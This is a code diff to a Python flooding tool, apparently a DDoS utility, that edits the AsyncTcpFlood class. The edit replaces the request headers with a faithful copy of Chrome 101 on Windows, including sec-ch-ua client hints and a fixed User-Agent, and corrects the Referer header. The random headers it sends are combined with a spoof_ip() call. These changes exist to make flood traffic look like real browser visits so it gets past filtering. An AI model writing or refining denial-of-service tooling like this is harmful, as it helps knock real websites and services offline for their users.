@@ -176,17 +176,21 @@ class AttackSettings:
 
 class AsyncTcpFlood:
     BASE_HEADERS = (
+        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
         'Accept-Encoding: gzip, deflate, br\r\n'
-        'Accept-Language: ru\r\n'
-        'Cache-Control: max-age=0\r\n'
-        'Connection: Keep-Alive\r\n'
+        'Accept-language: ru\r\n'
+        'Cache-Control: no-cache\r\n'
+        'Connection: keep-alive\r\n'
+        'Pragma: no-cache\r\n'
+        'sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"\r\n'
+        'sec-ch-ua-mobile: ?0\r\n'
+        'sec-ch-ua-platform: "Windows"\r\n'
         'Sec-Fetch-Dest: document\r\n'
         'Sec-Fetch-Mode: navigate\r\n'
         'Sec-Fetch-Site: none\r\n'
         'Sec-Fetch-User: ?1\r\n'
-        'Sec-Gpc: 1\r\n'
-        'Pragma: no-cache\r\n'
         'Upgrade-Insecure-Requests: 1\r\n'
+        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36\r\n'
     )
 
     def __init__(
@@ -235,8 +239,7 @@ class AsyncTcpFlood:
 
     def random_headers(self) -> str:
         return (
-            f"User-Agent: {random.choice(USERAGENTS)}\r\n"
-            f"Referrer: {random.choice(REFERERS)}{parse.quote(self._target.human_repr())}\r\n" +
+            f"Referer: {random.choice(REFERERS)}{parse.quote(self._target.human_repr())}\r\n" +
             self.spoof_ip()
         )
 
